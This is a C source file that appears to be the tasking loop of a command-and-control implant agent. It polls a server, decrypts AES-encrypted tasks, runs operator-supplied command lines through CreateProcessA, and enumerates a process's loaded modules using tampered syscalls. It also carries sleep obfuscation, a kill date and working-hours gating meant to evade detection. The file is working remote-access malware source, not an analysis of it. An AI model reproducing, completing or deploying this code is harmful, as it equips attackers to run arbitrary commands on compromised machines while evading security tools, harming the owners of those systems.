#include "../../headers/taskcontroller/TaskController.h"
#include "../../headers/agent/evasion/Common.h"
#include "../../headers/package/package.h"
#include "../../headers/cstdreplacement/localcstd.h"


void TaskingRoutine() {

    PARSER   Parser = { 0 };
    DataBuffer   Buffer = { 0 };
    SIZE_T   DataBufferSize = { 0 };
    PARSER   TaskParser = { 0 };
    LPVOID   TaskBuffer = { 0 };
    UINT32   TaskBufferSize = { 0 };
	AgentCMD AgentCMD = { 0 };
	pPackage pPackage = NULL;
	UINT32   RESULT = 0;

    while (TRUE) {
        if (!agent->session->Active)
            break;
        
        PerformSleepObf();

        if (ReachedKillDate()) {
            printf("[info] Kill date reached, exiting agent.\n");
            exit(-1);
        }

        if (!InWorkingHours())
        {
            continue;
        }

        //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
        if (!PackageSendAll(&Buffer, &DataBufferSize))
        {
            break;
        }

		if (Buffer.Buffer && Buffer.BufferLength > 0) { // if we successfully sent our queued packages and received a response.

            NewParser(&Parser, Buffer.Buffer, Buffer.BufferLength);
			Parser.Endian = TRUE;
			AgentCMD.MagicValue = ParserReadNBytes(&Parser, 4);
            AgentCMD.CommandID = ParserReadInt32(&Parser);
            AgentCMD.RequestID = ParserReadInt32(&Parser);
			Parser.Endian = FALSE;
			TaskBuffer = ParserReadBytes(&Parser, &TaskBufferSize);


			if (AgentCMD.MagicValue != AGENT_MAGIC_VALUE) {
				printf("[error] invalid magic value\n");
				break;
			}

			//TODO loop through this part if we ahve multiple commands inbound. need to reparse task buffer. with header.
			if (TaskBufferSize > 0) {
				if (TaskBuffer != NULL) {
					if((RESULT = AESCTR(TaskBuffer, TaskBufferSize, agent->AESKey, AES_256_KEY_SIZE, agent->IV)) != 0) {
						printf("[error] attempting to decrypt task buffer\n");
						break;
					}
					NewParser(&TaskParser, TaskBuffer, TaskBufferSize);
				}else {
					break;
				}

			}

		    switch (AgentCMD.CommandID) {
                case NO_JOB:
                	printf("[info] no job to do.\n");
                	pPackage = CreateDataPackage(SEND_DATA, NO_JOB);
                    break;

                case REGISTER_AGENT:
                    PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL);
                    break;

		        case LIST_LOADED_MODULES:
		        	pPackage = CreateDataPackage(SEND_DATA, LIST_LOADED_MODULES);

					NTSTATUS NtStatus = 0x00;
		    		PROCESS_BASIC_INFORMATION PBI = {0};
		    		OBJECT_ATTRIBUTES ObjAttr = {0};
		    		HANDLE hProc = NULL;
		    		CLIENT_ID ClientID = {0};
		    		ClientID.UniqueProcess = agent->Context->PID;
		    		ClientID.UniqueThread = agent->Context->TID;

		    		InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);

		    	printf("[info] in loaded modules\n");

					if ((NtStatus =  TAMPER_SYSCALL(agent->apis->pNtOpenProcess, 4, &hProc, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID)) != 0x00) {
						printf("[error] attempting to call NtOpenProcess %llx\n", NtStatus);
						break;
					}
		    		if ((NtStatus = TAMPER_SYSCALL(agent->apis->pNtQueryInformationProcess, 5, hProc, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), NULL)) != 0x00) {
						printf("[error] attempting to call NtQueryInformationProcess %llx\n", NtStatus);
		    			break;
		    		}

		    	PPEB_LDR_DATA LoaderData = NULL;
		    	PLIST_ENTRY ListHead, ListEntry = NULL;
		    	SIZE_T size = 0;
		    	LDR_DATA_TABLE_ENTRY CurrentModule = {0};
		    	WCHAR ModuleNameW[MAX_PATH] = {0};
		    	CHAR ModuleNameA[MAX_PATH] = {0};

					AddInt32ToPackage(pPackage, agent->Context->PID);

		    	if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &PBI.PebBaseAddress->Ldr, &LoaderData, sizeof(PPEB_LDR_DATA), NULL)) == 0x00) {
					ListHead = &LoaderData->InMemoryOrderModuleList;
		    		size = 0;
		    		if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, &ListHead->Flink, &ListEntry, sizeof(PLIST_ENTRY), NULL)) == 0x00) {
		    			while(ListEntry != ListHead) {
		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &CurrentModule, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) != 0x00) {
		    					break;
		    				}
		    				if((NtStatus = TAMPER_SYSCALL(agent->apis->pNtReadVirtualMemory, 5, hProc, CurrentModule.FullDllName.Buffer, &ModuleNameW, CurrentModule.FullDllName.Length, &size)) != 0x00) {
		    					break;
		    				}
		    				if (CurrentModule.FullDllName.Length > 0) {
		    					//printf("%ws\n", ModuleNameW);
		    					size = WCharToChar(ModuleNameA, ModuleNameW, CurrentModule.FullDllName.Length);

		    					AddStringToPackage(pPackage, ModuleNameA);
		    					AddPtrToPackage(pPackage, CurrentModule.DllBase);
		    				}

							MemorySet(ModuleNameW, 0, MAX_PATH);
		    				MemorySet(ModuleNameA, 0, MAX_PATH);

		    				ListEntry = CurrentModule.InMemoryOrderLinks.Flink;
		    			}
		    		}
		    	}

		    		if(hProc)
		    			NtStatus = TAMPER_SYSCALL(agent->apis->pNtClose, 1, hProc);
		    		if (NtStatus != 0x00) {
		    			agent->apis->pNtClose(hProc);
		    		}
					break; // LIST LOADED MODULES

		    	case EXECUTE_CMD:
		    		pPackage = CreateDataPackage(SEND_DATA, EXECUTE_CMD);
		    		UINT Length = 0;
		    		UINT NumberOfArgs = ParserReadInt32(&TaskParser);

		    		UCHAR CMDLINE[4196] = {0};
		    		INT Index = 0;

		    		for(int i = 0 ; i < NumberOfArgs; i++) {
		    			PUCHAR Data = ParserReadBytes(&TaskParser, &Length);

		    			if (!Data || Length == 0)
		    				break;

		    			MemoryCopy(&CMDLINE[Index], Data, Length);
		    			Index += Length;
		    			MemorySet(&CMDLINE[Index], 0x20, 1);
		    			Index += 1;

		    		}

		    		STARTUPINFOA si = {0};
		    		PROCESS_INFORMATION pi = {0};
		    		si.cb = sizeof(si);

		    		if(CreateProcessA(NULL, CMDLINE, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		    			AddInt32ToPackage(pPackage, pi.dwProcessId);
		    			MemorySet(CMDLINE, 0, Index);
		    			agent->apis->pNtClose(pi.hProcess);

		    		} else {
		    			DWORD err = GetLastError();
		    			printf("[error] failed to create process %lu\n", err);
		    			AddInt32ToPackage(pPackage, 0);
		    			break;
		    		}
		    		break;


                default:
                    break;
            }
        }
        else // we did not rececive a response from the server server is down or we have no connectivity.
        { 
			break;
        }
    	if(pPackage != NULL) {
    		if( pPackage->Length > 0) {
    			AddInt32ToBuffer(pPackage->Buffer, pPackage->Length);
    			AddPackageToAgentPackageList(pPackage);
    		}
    	}


    }

    agent->session->Active = FALSE;

}


BOOL ReachedKillDate() {
	UINT64 CurrentTime = 0;
    CurrentTime = GetUnixTime();
    if (CurrentTime >= agent->config->KillDate) {
        return TRUE;
    }
	return FALSE;
}

BOOL InWorkingHours() {
	SYSTEMTIME SystemTime = { 0 };
	UINT32 WorkingHours = agent->config->WorkingHours;
    WORD StartHour = 0;
    WORD StartMinute = 0;
    WORD EndHour = 0;
    WORD EndMinute = 0;

	//if working hours not set return true as we're always in working hours.
    if (((WorkingHours >> 22) & 1) == 0)
        return TRUE;

    StartHour = (WorkingHours >> 17) & 0b011111;
    StartMinute = (WorkingHours >> 11) & 0b111111;
    EndHour = (WorkingHours >> 6) & 0b011111;
    EndMinute = (WorkingHours >> 0) & 0b111111;

	agent->apis->pGetLocalTime(&SystemTime);

	if (SystemTime.wHour < StartHour || SystemTime.wHour > EndHour)
		return FALSE;
	if (SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute)
		return FALSE;
	if (SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute)
		return FALSE;

	return TRUE;
}